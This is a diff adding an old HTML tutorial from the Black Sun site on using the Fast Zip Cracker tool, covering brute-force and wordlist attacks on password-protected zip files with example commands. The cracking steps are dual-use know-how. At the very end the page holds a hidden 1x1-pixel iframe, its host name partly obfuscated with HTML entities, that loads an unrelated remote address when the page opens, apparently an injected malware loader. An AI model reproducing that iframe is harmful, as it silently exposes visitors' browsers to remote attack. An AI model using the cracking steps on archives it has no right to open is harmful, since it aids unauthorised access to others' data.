@@ -1,0 +1,200 @@
+<html>
+<head>
+<title>Untitled Document</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#FFFFFF" text="#000000">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr> 
+    <td width="693"> 
+      <pre>
+                        :::::::::   ::::::::  :::::::::  :::::::::: 
+                        :+:    :+: :+:    :+: :+:    :+: :+:        
+                        +:+    +:+ +:+        +:+    +:+ +:+        
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#   
+                        +#+    +#+        +#+ +#+    +#+ +#+        
+                        #+#    #+# #+#    #+# #+#    #+# #+#        
+                        #########   ########  ###    ### ###  
+                         
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I      <b>How to use the</b>         I   Written by:     /
+    >                     I   <b>Fast Zip Cracker (FZC)</b>    I   <a href="mailto:Ghost_Rider9@hotmail.com">Ghost_Rider</a>    < 
+   /      <a href="mailto:black_mesa@gmx.de">Martin L.</a>       I_____________________________I   <a href="mailto:barakirs@netvision.net.il">R a v e N</a>       \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+<p>8/1/2000 </p>
+<p><br>
+  What is FZC? FZC is a program that cracks zip files (zip is a method of compressing 
+  multiple files into one smaller file) that are password-protected (which means 
+  you're gonna need a password to open the zip file and extract files out of it). 
+  You can get it anywhere - just use a search engine such as altavista.com.<br>
+  FZC uses multiple methods of cracking - bruteforce (guessing passwords systematically 
+  until the program gets it) or wordlist attacks (otherwise known as dictionary 
+  attacks. Instead of just guessing passwords systematically, the program takes 
+  passwords out of a &quot;wordlist&quot;, which is a text file that contains 
+  possible passwords. You can get lots of wordlists at www.theargon.com. Thanks 
+  to Caboom for this tip).<br>
+  FZC can be used in order to achieve two different goals: you can either use 
+  it to recover a lost zip password which you used to remember but somehow forgot, 
+  or to crack zip passwords which you're not supposed to have. So like every tool, 
+  this one can be used for good and for evil.<br>
+  The first thing I want to say is that reading this tutorial... is the easy way 
+  to learn how to use this program, but after reading this part of how to use 
+  the FZC you should go and check the texts that come with that program and read 
+  them all. You are also going to see the phrase &quot;check name.txt&quot; often 
+  in this text. These files should be in FZC's directory. They contain more information 
+  about FZC.<br>
+  FZC is a good password recovery tool, because it's very fast and also support 
+  resuming so you don't have to keep the computer turned on until you get the 
+  password, like it used to be some years ago with older cracking programs. You 
+  would probably always get the password unless the password is longer than 32 
+  chars (a char is a character, which can be anything - a number, a lowercase 
+  or undercase letter or a symbol such as ! or &amp;) because 32 chars is the 
+  maximum value that FZC will accept, but it doesn't really matter, because in 
+  order to bruteforce a password with 32 chars you'll need to be at least immortal..heehhe.. 
+  to see the time that FZC takes with bruteforce just open the Bforce.txt file, 
+  which contains such information.<br>
+  FZC supports brute-force attacks, as well as wordlist attacks. While brute-force 
+  attacks don't require you to have anything, wordlist attacks require you to 
+  have wordlists, which you can get from www.theargon.com. There are wordlists 
+  in various languages, various topics or just miscellaneous wordlists. The bigger 
+  the wordlist is, the more chances you have to crack the password.<br>
+  Now that you have a good wordlist, just get FZC working on the locked zip file, 
+  grab a drink, lie down and wait... and wait... and wait...and have good thoughts 
+  like &quot;In wordlist mode I'm gonna get the password in minutes&quot; or something 
+  like this... you start doing all this and remember &quot;Hey this guy started 
+  with all this bullshit and didn't say how I can start a wordlist attack!...&quot; 
+  So please wait just a little more, read this tutorial 'till the end and you 
+  can do all this &quot;bullshit&quot;. :)</p>
+<p> We need to keep in mind that are some people might choose some really weird 
+  passwords (for example: 'e8t7@$^%*gfh), which are harder to crack and are certainly 
+  impossible to crack (unless you have some weird wordlist). If you have a bad 
+  luck and you got such a file, having a 200MB list won't help you anymore. Instead, 
+  you'll have to use a different type of attack. If you are a person that gives 
+  up at the first sign of failure, stop being like that or you won't get anywhere. 
+  What you need to do in such a situation is to put aside your sweet xxx MB's 
+  list and start using the Brute Force attack.<br>
+  If you have some sort of a really fast and new computer and you're afraid that 
+  you won't be able to use your computer's power to the fullest because the zip 
+  cracker doesn't support this kind of technology, it's your lucky day! FZC has 
+  multiple settings for all sorts of hardware, and will automatically select the 
+  best method.</p>
+<p> Now that we've gone through all the theoretical stuff, let's get to the actual 
+  commands.</p>
+<hr width="250" align="left">
+<b><font size="4">Bruteforce </font></b>
+<hr width="250" align="left">
+<br>
+<p> The command line you'll need to use for using brute force is:</p>
+<p> fzc -mb -nzFile.zip -lChr Lenght -cType of chars</p>
+<p> Now if you read the bforce.txt that comes with fzc you'll find the description 
+  of how works Chr Lenght and the Type of chars, but hey, I'm gonna explain this 
+  too. Why not, right?...;) (but remember look at the bforce.txt too)</p>
+<p> For Chr Lenght you can use 4 kind of switches...<br>
+  <br>
+  -&gt; You can use range -&gt; 4-6 :it would brute force from 4 Chr passwors 
+  to 6 chr passwords<br>
+  -&gt; You can use just one lenght -&gt; 5 :it would just brute force using passwords 
+  with 5 chars<br>
+  -&gt; You can use also the all number -&gt; 0 :it would start brute forcing 
+  from passwords with lenght 0 to lenght 32, even if you are crazy i don't think 
+  that you would do this.... if you are thinking in doing this get a live...<br>
+  -&gt; You can use the + sign with a number -&gt; 3+ :in this case it would brute 
+  force from passwords with lenght 3 to passwords with 32 chars of lenght, almost 
+  like the last option...</p>
+<p> For the Type of chars we have 5 switches they are:</p>
+<p> -&gt; a for using lowercase letters<br>
+  -&gt; A for using uppercase letters<br>
+  -&gt; ! for using simbols (check the Bforce.txt if you want to see what simbols)<br>
+  -&gt; s for using space <br>
+  -&gt; 1 for using numbers<br>
+  <br>
+  <br>
+  Example:<br>
+  If you want to find a password with lowercase and numbers by brute force you 
+  would just do something like:<br>
+  <br>
+  fzc -mb -nzTest.zip -l4-7 -ca1</p>
+<p> This would try all combinations from passwords with 4 chars of lenght till 
+  7 chars, but just using numbers and lowercase.</p>
+<p>*****<br>
+  <b><font size="3">hint</font></b><br>
+  *****<br>
+  <br>
+  You should never start the first brute force attack to a file using all the 
+  chars switches, first just try lowercase, then uppercase, then uppercase with 
+  number then lowercase with numbers, just do like this because you can get lucky 
+  and find the password much faster, if this doesn't work just prepare your brain 
+  and start with a brute force that would take a lot of time. With a combination 
+  like lowercase, uppercase, special chars and numbers. </p>
+<hr width="250" align="left">
+<b><font size="4">Wordlis</font></b>
+<hr width="250" align="left">
+<p> Like I said in the bottom and like you should be thinking now, the wordlist 
+  is the most powerfull mode in this program. Using this mode, you can choose 
+  between 3 modes, where each one do some changes to the text that is in the wordlist, 
+  I'm not going to say what each mode does to the words, for knowing that just 
+  check the file wlist.txt, the only thing I'm going to tell you is that the best 
+  mode to get passwords is mode 3, but it takes longer time too.<br>
+  To start a wordlist attak you'll do something like.<br>
+  <br>
+  fzc -mwMode number -nzFile.zip -nwWordlist <br>
+  <br>
+  Where: </p>
+<p> Mode number is 1, 2 or 3 just check wlist.txt to see the changes in each mode. 
+  <br>
+  File.zip is the filename and Wordlist is the name of the wordlist that you want 
+  to use. Remember that if the file or the wordlist isn't in the same directory 
+  of FZC you'll need to give the all path.<br>
+  <br>
+  You can add other switches to that line like -fLine where you define in which 
+  line will FZC start reading, and the -lChar Length where it will just be read 
+  the words in that char length, the switche works like in bruteforce mode.<br>
+  So if you something like <br>
+  <br>
+  fzc -mw1 -nztest.zip -nwMywordlist.txt -f50 -l9+</p>
+<p> FZC would just start reading at line 50 and would just read with length &gt;= 
+  to 9.</p>
+<p> Example:</p>
+<p> If you want to crack a file called myfile.zip using the &quot;theargonlistserver1.txt&quot; 
+  wordlist, selecting mode 3, and you wanted FZC to start reading at line 50 you 
+  would do:</p>
+<p> fzc -mw3 -nzmyfile.zip -nwtheargonlistserver1.txt -f50</p>
+<p><br>
+</p>
+<hr width="250" align="left">
+<b><font size="4">Resuming </font></b> 
+<hr width="250" align="left">
+<p> Other good feature in FZC is that FZC supports resuming. If you need to shutdown 
+  your computer and FZC is running you just need to press the ESC key, and fzc 
+  will stop. Now if you are using a brute force attack the current status will 
+  be saved in a file called resume.fzc but if you are using a wordlist it will 
+  say to you in what line it ended (you can find the line in the file fzc.log 
+  too). <br>
+  To resume the bruteforce attack you just need to do:</p>
+<p> fzc -mr <br>
+  <br>
+  And the bruteforce attack will start from the place where it stopped when you 
+  pressed the ESC key.<br>
+  But if you want to resume a wordlist attack you'll need to start a new wordlist 
+  attack, saying where it's gonna start. So if you ended the attack to the file.zip 
+  in line 100 using wordlist.txt in mode 3 to resume you'll type </p>
+<p> fzc -mw3 -nzfile.zip -nwwordlist.txt -f100</p>
+<p> Doing this FZC would start in line 100, since the others 99 lines where already 
+  checked in an earlier FZC session.</p>
+<p></p>
+<p> Well, it looks like I covered most of what you need to know. I certainly hope 
+  it helped you... don't forget to read the files that come with the program, 
+  and visit http://blacksun.box.sk for more tutorials. If you have any problem 
+  fell free to post your questions on the message board at blacksun.box.sk, but 
+  don't send me any files to crack for you! Use your own computer power.</p>
+<p></p>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
